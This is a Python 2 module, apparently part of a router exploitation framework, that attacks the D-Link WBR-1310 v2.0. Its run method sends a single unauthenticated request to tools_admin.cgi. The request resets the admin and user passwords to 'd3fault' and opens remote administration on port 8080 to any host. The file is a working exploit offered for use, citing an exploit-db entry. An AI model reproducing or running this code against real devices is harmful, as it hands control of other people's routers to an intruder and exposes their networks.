import urllib
import util
from ..router_vuln import RouterVuln

__router__='WBR-1310 v2.0'
__vuln__='Change Admin Password'
class ChangeAdmin(RouterVuln):
	"""Changes the admin psasword to d3fault and enables remote administration
	   on port 8080.
	   http://www.exploit-db.com/exploits/15810/
	"""
	def __init__(self):
		super(ChangeAdmin,self).__init__()

	def run(self):
		util.Msg('Changing admin password to \'d3fault\' and enabling remote admin on port 8080...')
		try:
			url = 'http://%s/tools_admin.cgi?admname=admin&admPass1=d3fault' \
				  '&admPass2=d3fault&username=admin&userPass1=d3fault&userPass2=d3fault' \
				  '&hip1=*&hport=8080&hEnable=1'%self.ip
			response = urllib.urlopen(url).read()
			util.Msg('Admin password changed to \'d3fault\' and interface enabled on 8080')
		except Exception,e:
			util.Error('Error: %s'%e)
